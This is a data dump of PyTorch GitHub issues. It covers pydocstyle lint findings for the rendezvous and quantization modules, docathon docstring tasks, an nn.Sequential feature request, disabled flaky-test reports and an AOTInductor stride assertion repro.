- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `announce_self_waiting`, **Line**: 644, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_rendezvous_to_free`, **Line**: 671, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_rendezvous_to_free`, **Line**: 671, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `handle_join_last_call`, **Line**: 741, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `handle_join_last_call`, **Line**: 741, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `handle_join_last_call`, **Line**: 741, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `set_closed`, **Line**: 814, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `set_closed`, **Line**: 814, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `_create_etcd_client`, **Line**: 972, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `_create_etcd_client`, **Line**: 972, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `create_rdzv_handler`, **Line**: 1009, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `find_free_port`, **Line**: 29, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `find_free_port`, **Line**: 29, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `find_free_port`, **Line**: 29, **Description**: First line should be in imperative mood (perhaps 'Find', not 'Finds')
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `EtcdServer`, **Line**: 78, **Description**: First line should end with a period (not '3')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_port`, **Line**: 136, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_port`, **Line**: 136, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_port`, **Line**: 136, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_host`, **Line**: 143, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_host`, **Line**: 143, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_host`, **Line**: 143, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_endpoint`, **Line**: 150, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_endpoint`, **Line**: 150, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_endpoint`, **Line**: 150, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `start`, **Line**: 162, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `start`, **Line**: 162, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `start`, **Line**: 162, **Description**: First line should be in imperative mood (perhaps 'Start', not 'Starts')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_client`, **Line**: 229, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_client`, **Line**: 229, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_client`, **Line**: 229, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `stop`, **Line**: 259, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `stop`, **Line**: 259, **Description**: First line should end with a period (not ')')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `stop`, **Line**: 259, **Description**: First line should be in imperative mood (perhaps 'Stop', not 'Stops')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/static_tcp_rendezvous.py`, **Entity**: `StaticTCPRendezvous`, **Line**: 25, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/utils.py`, **Entity**: `_parse_rendezvous_config`, **Line**: 20, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/utils.py`, **Entity**: `_try_parse_port`, **Line**: 58, **Description**: First line should be in imperative mood (perhaps 'Try', not 'Tries')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/utils.py`, **Entity**: `parse_rendezvous_endpoint`, **Line**: 65, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/utils.py`, **Entity**: `_matches_machine_hostname`, **Line**: 112, **Description**: First line should be in imperative mood (perhaps 'Indicate', not 'Indicates')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/utils.py`, **Entity**: `set_name`, **Line**: 232, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `get_backend`, **Line**: 44, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `next_rendezvous`, **Line**: 50, **Description**: First line should be in imperative mood; try rephrasing (found 'Main')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `is_closed`, **Line**: 73, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `set_closed`, **Line**: 87, **Description**: First line should be in imperative mood (perhaps 'Mark', not 'Marks')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `num_nodes_waiting`, **Line**: 91, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `num_nodes_waiting`, **Line**: 91, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `num_nodes_waiting`, **Line**: 91, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `get_run_id`, **Line**: 101, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `shutdown`, **Line**: 110, **Description**: First line should be in imperative mood (perhaps 'Close', not 'Closes')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `get`, **Line**: 174, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `get_as_bool`, **Line**: 178, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `get_as_int`, **Line**: 197, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `register`, **Line**: 222, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `create_handler`, **Line**: 249, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')

cc @carljparker",False
"Allow passing `(<name>, <module>)` tuples to `nn.Sequential` module: nn triaged enhancement","### üöÄ The feature, motivation and pitch

*(I am ready to implement this feature)*

Currently, creating a `nn.Sequential` with named modules requires one more import and two more indentations compared to the version without names:

```
# Without names.
model = nn.Sequential(
   hello_module,
   world_module,
)
```
```
# With names.
from collections import OrderedDict

model = nn.Sequential(
    OrderedDict(
        [
            ('hello', hello_module),
            ('world', world_module),
        ]
    )
)
```

Given how frequently this construction occurs in practice, I propose improving its ergonomics by allowing the following:

```
# With names.
model = nn.Sequential(
    ('hello', hello_module),
    ('world', world_module),
)
```

The new constructor should raise an exception if there are duplicated names among the provided tuples.

### Alternatives

_No response_

### Additional context

There is also https://github.com/pytorch/pytorch/issues/84751. However:
- The linked issue seems to have a significantly wider scope.
- This is something I am not sure about, but I'll mention this just in case: the proposed version has a pretty simple semantics which is ""order of tuples == order of modules"". With the `dict`-based version, technically, it is also true, but it may be slightly less intuitive given a long history of `dict` being unordered (and similar collections being unordered in other languages).

cc @albanD @mruberry @jbschlosser @walterddr @mikaylagawarecki",False
DISABLED test_lgamma_cpu (__main__.CpuTests) triaged module: flaky-tests skipped module: inductor,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_lgamma_cpu&suite=CpuTests) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18429305821).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_lgamma_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `inductor/test_torchinductor.py`

cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @peterbell10 @ipiszy @yf225 @chenyang78 @kadeng @muchulee8 @aakhundov @ColinPeppler",False
Is there any function in pytorch that can visualize the function calling relationship and the calling relationship of the dynamic link library? ,"### üöÄ The feature, motivation and pitch

Is there any function in pytorch that can visualize the function calling relationship and the calling relationship of the dynamic link library?

### Alternatives

_No response_

### Additional context

_No response_",False
Add Docstrings to ./torch/_refs/__init__.py module: docs triaged medium docathon-h2-2023,"Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/__init__.py`, **Line**: 1663
- **File**: `./torch/_refs/__init__.py`, **Line**: 1672
- **File**: `./torch/_refs/__init__.py`, **Line**: 1682
- **File**: `./torch/_refs/__init__.py`, **Line**: 1703
- **File**: `./torch/_refs/__init__.py`, **Line**: 1742
- **File**: `./torch/_refs/__init__.py`, **Line**: 1778

cc @carljparker",False
Add Docstrings to ./torch/_refs/__init__.py module: docs triaged medium docathon-h2-2023,"Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/__init__.py`, **Line**: 1616
- **File**: `./torch/_refs/__init__.py`, **Line**: 1629
- **File**: `./torch/_refs/__init__.py`, **Line**: 1638
- **File**: `./torch/_refs/__init__.py`, **Line**: 1646
- **File**: `./torch/_refs/__init__.py`, **Line**: 1654

cc @carljparker",False
Add Docstrings to ./torch/_refs/__init__.py module: docs triaged medium docathon-h2-2023,"Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/__init__.py`, **Line**: 1526
- **File**: `./torch/_refs/__init__.py`, **Line**: 1584
- **File**: `./torch/_refs/__init__.py`, **Line**: 1596
- **File**: `./torch/_refs/__init__.py`, **Line**: 1604
- **File**: `./torch/_refs/__init__.py`, **Line**: 1616

cc @carljparker",False
Add Docstrings to ./torch/_refs/__init__.py module: docs triaged medium docathon-h2-2023,"Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/__init__.py`, **Line**: 1361
- **File**: `./torch/_refs/__init__.py`, **Line**: 1371
- **File**: `./torch/_refs/__init__.py`, **Line**: 1381
- **File**: `./torch/_refs/__init__.py`, **Line**: 1390
- **File**: `./torch/_refs/__init__.py`, **Line**: 1504

cc @carljparker",False
Add Docstrings to ./torch/_refs/__init__.py module: docs triaged medium docathon-h2-2023,"Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/__init__.py`, **Line**: 1183
- **File**: `./torch/_refs/__init__.py`, **Line**: 1211
- **File**: `./torch/_refs/__init__.py`, **Line**: 1269
- **File**: `./torch/_refs/__init__.py`, **Line**: 1341
- **File**: `./torch/_refs/__init__.py`, **Line**: 1351

cc @carljparker",False
Add Docstrings to ./torch/_refs/__init__.py module: docs triaged medium docathon-h2-2023,"Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/__init__.py`, **Line**: 1114
- **File**: `./torch/_refs/__init__.py`, **Line**: 1122
- **File**: `./torch/_refs/__init__.py`, **Line**: 1130
- **File**: `./torch/_refs/__init__.py`, **Line**: 1148
- **File**: `./torch/_refs/__init__.py`, **Line**: 1174

cc @carljparker",False
"Add Docstrings to ./torch/_refs/__init__.py, ./torch/_refs/special/__init__.py, ./torch/masked/_ops.py module: docs triaged medium docathon-h2-2023","Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/special/__init__.py`, **Line**: 231
- **File**: `./torch/masked/_ops.py`, **Line**: 1479
- **File**: `./torch/_refs/__init__.py`, **Line**: 1080
- **File**: `./torch/_refs/__init__.py`, **Line**: 1090
- **File**: `./torch/_refs/__init__.py`, **Line**: 1098
- **File**: `./torch/_refs/__init__.py`, **Line**: 1106

cc @carljparker",False
DISABLED test_2d_optim_state_dict_is_even_sharded_model_True (__main__.TestNew2dParallelStateDict) skipped,"
Probably the same situation as https://github.com/pytorch/pytorch/issues/112969


This test was disabled because it is failing on main branch ([recent examples](http://torch-ci.com/failure/distributed%2Ftensor%2Fparallel%2Ftest_fsdp_2d_parallel.py%3A%3ATestNew2dParallelStateDict%3A%3Atest_2d_optim_state_dict_is_even_sharded_model_True)).
```
2023-11-06T15:42:54.5951979Z =========================== short test summary info ============================
2023-11-06T15:42:54.5953682Z FAILED [3.0441s] distributed/tensor/parallel/test_fsdp_2d_parallel.py::TestNew2dParallelStateDict::test_2d_optim_state_dict_is_even_sharded_model_True - RuntimeError: Process 0 exited with error code 10 and exception:
2023-11-06T15:42:54.5955162Z Traceback (most recent call last):
2023-11-06T15:42:54.5956257Z   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 658, in run_test
2023-11-06T15:42:54.5957268Z     getattr(self, test_name)()
2023-11-06T15:42:54.5958307Z   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 544, in wrapper
2023-11-06T15:42:54.5959291Z     fn()
2023-11-06T15:42:54.5960202Z   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_utils.py"", line 2536, in wrapper
2023-11-06T15:42:54.5961164Z     method(*args, **kwargs)
2023-11-06T15:42:54.5962216Z   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_utils.py"", line 364, in instantiated_test
2023-11-06T15:42:54.5963245Z     test(self, **param_kwargs)
2023-11-06T15:42:54.5964399Z   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/distributed/_tensor/common_dtensor.py"", line 190, in wrapper
2023-11-06T15:42:54.5965612Z     func(self, *args, **kwargs)  # type: ignore[misc]
2023-11-06T15:42:54.5966806Z   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 174, in wrapper
2023-11-06T15:42:54.5967981Z     return func(*args, **kwargs)
2023-11-06T15:42:54.5969018Z   File ""/var/lib/jenkins/workspace/test/distributed/tensor/parallel/test_fsdp_2d_parallel.py"", line 571, in test_2d_optim_state_dict
2023-11-06T15:42:54.5970105Z     _, no_wrap_osd = get_state_dict(
2023-11-06T15:42:54.5970814Z TypeError: get_state_dict() got an unexpected keyword argument 'optim_only'
```
",False
"[aotinductor] xcit_large_24_p8_224: AssertionError: expected size 768==768, stride 784==1 at dim=1 triaged oncall: pt2","Repro:
```
python benchmarks/dynamo/timm_models.py --inference --bfloat16   --disable-cudagraphs --device cuda --only xcit_large_24_p8_224   --export-aot-inductor --performance
```
Error:
```
    assert_size_stride(buf12, (1, 768, 28, 28), (602112, 1, 21504, 768))
AssertionError: expected size 768==768, stride 784==1 at dim=1
```

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
torch/ao/quantization pydocstyle module: docs triaged medium topic: not user facing docathon-h2-2023,"### üìö The doc issue

For files
```
__init__.py
_correct_bias.py
_equalize.py
_learnable_fake_quantize.py
backend_config
experimental
fake_quantize.py
fuse_modules.py
fuser_method_mappings.py
```

Correct the following
```
__init__.py:1 at module level:
        D104: Missing docstring in public package
__init__.py:144 in public function `default_eval_fn`:
        D205: 1 blank line required between summary line and description (found 0)
__init__.py:144 in public function `default_eval_fn`:
        D400: First line should end with a period (not 'f')
__init__.py:144 in public function `default_eval_fn`:
        D401: First line should be in imperative mood; try rephrasing (found 'Default')
__init__.py:152 in private class `_DerivedObserverOrFakeQuantize`:
        D204: 1 blank line required after class docstring (found 0)
__init__.py:152 in private class `_DerivedObserverOrFakeQuantize`:
        D205: 1 blank line required between summary line and description (found 0)
__init__.py:152 in private class `_DerivedObserverOrFakeQuantize`:
        D210: No whitespaces allowed surrounding docstring text
__init__.py:152 in private class `_DerivedObserverOrFakeQuantize`:
        D400: First line should end with a period (not 's')
_correct_bias.py:20 in public function `get_module`:
        D200: One-line docstring should fit on one line with quotes (found 2)
_correct_bias.py:20 in public function `get_module`:
        D210: No whitespaces allowed surrounding docstring text
_correct_bias.py:20 in public function `get_module`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_correct_bias.py:20 in public function `get_module`:
        D400: First line should end with a period (not 'l')
_correct_bias.py:25 in public function `parent_child_names`:
        D200: One-line docstring should fit on one line with quotes (found 2)
_correct_bias.py:25 in public function `parent_child_names`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_correct_bias.py:25 in public function `parent_child_names`:
        D400: First line should end with a period (not 'e')
_correct_bias.py:25 in public function `parent_child_names`:
        D401: First line should be in imperative mood (perhaps 'Split', not 'Splits')
_correct_bias.py:34 in public function `get_param`:
        D205: 1 blank line required between summary line and description (found 0)
_correct_bias.py:34 in public function `get_param`:
        D210: No whitespaces allowed surrounding docstring text
_correct_bias.py:34 in public function `get_param`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_correct_bias.py:34 in public function `get_param`:
        D400: First line should end with a period (not 's')
_correct_bias.py:44 in public class `MeanShadowLogger`:
        D204: 1 blank line required after class docstring (found 0)
_correct_bias.py:44 in public class `MeanShadowLogger`:
        D205: 1 blank line required between summary line and description (found 0)
_correct_bias.py:44 in public class `MeanShadowLogger`:
        D400: First line should end with a period (not 'n')
_correct_bias.py:47 in public method `__init__`:
        D107: Missing docstring in __init__
_correct_bias.py:56 in public method `forward`:
        D205: 1 blank line required between summary line and description (found 0)
_correct_bias.py:56 in public method `forward`:
        D210: No whitespaces allowed surrounding docstring text
_correct_bias.py:56 in public method `forward`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_correct_bias.py:56 in public method `forward`:
        D401: First line should be in imperative mood; try rephrasing (found 'The')
_correct_bias.py:77 in public method `clear`:
        D102: Missing docstring in public method
_correct_bias.py:85 in public function `bias_correction`:
        D205: 1 blank line required between summary line and description (found 0)
_correct_bias.py:85 in public function `bias_correction`:
        D210: No whitespaces allowed surrounding docstring text
_correct_bias.py:85 in public function `bias_correction`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_correct_bias.py:85 in public function `bias_correction`:
        D400: First line should end with a period (not 's')
_correct_bias.py:85 in public function `bias_correction`:
        D401: First line should be in imperative mood (perhaps 'Use', not 'Using')
_equalize.py:22 in public function `set_module_weight`:
        D103: Missing docstring in public function
_equalize.py:28 in public function `set_module_bias`:
        D103: Missing docstring in public function
_equalize.py:34 in public function `get_module_weight`:
        D103: Missing docstring in public function
_equalize.py:40 in public function `get_module_bias`:
        D103: Missing docstring in public function
_equalize.py:47 in public function `max_over_ndim`:
        D200: One-line docstring should fit on one line with quotes (found 2)
_equalize.py:47 in public function `max_over_ndim`:
        D210: No whitespaces allowed surrounding docstring text
_equalize.py:47 in public function `max_over_ndim`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_equalize.py:47 in public function `max_over_ndim`:
        D400: First line should end with a period (not 's')
_equalize.py:47 in public function `max_over_ndim`:
        D401: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
_equalize.py:55 in public function `min_over_ndim`:
        D200: One-line docstring should fit on one line with quotes (found 2)
_equalize.py:55 in public function `min_over_ndim`:
        D210: No whitespaces allowed surrounding docstring text
_equalize.py:55 in public function `min_over_ndim`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_equalize.py:55 in public function `min_over_ndim`:
        D400: First line should end with a period (not 's')
_equalize.py:55 in public function `min_over_ndim`:
        D401: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
_equalize.py:63 in public function `channel_range`:
        D200: One-line docstring should fit on one line with quotes (found 2)
_equalize.py:63 in public function `channel_range`:
        D210: No whitespaces allowed surrounding docstring text
_equalize.py:63 in public function `channel_range`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_equalize.py:63 in public function `channel_range`:
        D400: First line should end with a period (not 'l')
_equalize.py:63 in public function `channel_range`:
        D401: First line should be in imperative mood (perhaps 'Find', not 'finds')
_equalize.py:63 in public function `channel_range`:
        D403: First word of the first line should be properly capitalized ('Finds', not 'finds')
_equalize.py:76 in public function `cross_layer_equalization`:
        D205: 1 blank line required between summary line and description (found 0)
_equalize.py:76 in public function `cross_layer_equalization`:
        D210: No whitespaces allowed surrounding docstring text
_equalize.py:76 in public function `cross_layer_equalization`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_equalize.py:76 in public function `cross_layer_equalization`:
        D400: First line should end with a period (not 't')
_equalize.py:120 in public function `equalize`:
        D205: 1 blank line required between summary line and description (found 0)
_equalize.py:120 in public function `equalize`:
        D210: No whitespaces allowed surrounding docstring text
_equalize.py:120 in public function `equalize`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_equalize.py:120 in public function `equalize`:
        D400: First line should end with a period (not 'l')
_equalize.py:159 in public function `converged`:
        D205: 1 blank line required between summary line and description (found 0)
_equalize.py:159 in public function `converged`:
        D210: No whitespaces allowed surrounding docstring text
_equalize.py:159 in public function `converged`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_equalize.py:159 in public function `converged`:
        D400: First line should end with a period (not 's')
_equalize.py:159 in public function `converged`:
        D401: First line should be in imperative mood (perhaps 'Test', not 'Tests')
_learnable_fake_quantize.py:8 in private class `_LearnableFakeQuantize`:
        D204: 1 blank line required after class docstring (found 0)
_learnable_fake_quantize.py:8 in private class `_LearnableFakeQuantize`:
        D205: 1 blank line required between summary line and description (found 0)
_learnable_fake_quantize.py:8 in private class `_LearnableFakeQuantize`:
        D210: No whitespaces allowed surrounding docstring text
_learnable_fake_quantize.py:8 in private class `_LearnableFakeQuantize`:
        D400: First line should end with a period (not 'h')
_learnable_fake_quantize.py:68 in private method `enable_param_learning`:
        D205: 1 blank line required between summary line and description (found 0)
_learnable_fake_quantize.py:68 in private method `enable_param_learning`:
        D400: First line should end with a period (not 'd')
_learnable_fake_quantize.py:68 in private method `enable_param_learning`:
        D401: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
_learnable_fake_quantize.py:78 in private method `enable_static_estimate`:
        D205: 1 blank line required between summary line and description (found 0)
_learnable_fake_quantize.py:78 in private method `enable_static_estimate`:
        D400: First line should end with a period (not 'f')
_learnable_fake_quantize.py:78 in private method `enable_static_estimate`:
        D401: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
_learnable_fake_quantize.py:87 in private method `enable_static_observation`:
        D205: 1 blank line required between summary line and description (found 0)
_learnable_fake_quantize.py:87 in private method `enable_static_observation`:
        D400: First line should end with a period (not 't')
_learnable_fake_quantize.py:87 in private method `enable_static_observation`:
        D401: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
fake_quantize.py:1 at module level:
        D205: 1 blank line required between summary line and description (found 0)
fake_quantize.py:1 at module level:
        D400: First line should end with a period (not 'n')
fake_quantize.py:61 in public class `FakeQuantizeBase`:
        D205: 1 blank line required between summary line and description (found 0)
fake_quantize.py:61 in public class `FakeQuantizeBase`:
        D210: No whitespaces allowed surrounding docstring text
fake_quantize.py:61 in public class `FakeQuantizeBase`:
        D400: First line should end with a period (not 'e')
fake_quantize.py:74 in public method `__init__`:
        D107: Missing docstring in __init__
fake_quantize.py:83 in public method `forward`:
        D102: Missing docstring in public method
fake_quantize.py:87 in public method `calculate_qparams`:
        D102: Missing docstring in public method
fake_quantize.py:91 in public method `enable_fake_quant`:
        D102: Missing docstring in public method
fake_quantize.py:95 in public method `disable_fake_quant`:
        D102: Missing docstring in public method
fake_quantize.py:99 in public method `enable_observer`:
        D102: Missing docstring in public method
fake_quantize.py:103 in public method `disable_observer`:
        D102: Missing docstring in public method
fake_quantize.py:107 in public method `with_args`:
        D102: Missing docstring in public method
fake_quantize.py:115 in public class `FakeQuantize`:
        D205: 1 blank line required between summary line and description (found 0)
fake_quantize.py:115 in public class `FakeQuantize`:
        D210: No whitespaces allowed surrounding docstring text
fake_quantize.py:115 in public class `FakeQuantize`:
        D412: No blank lines allowed between a section header and its content ('Attributes')
fake_quantize.py:150 in public method `__init__`:
        D107: Missing docstring in __init__
fake_quantize.py:188 in public method `calculate_qparams`:
        D102: Missing docstring in public method
fake_quantize.py:191 in public method `forward`:
        D102: Missing docstring in public method
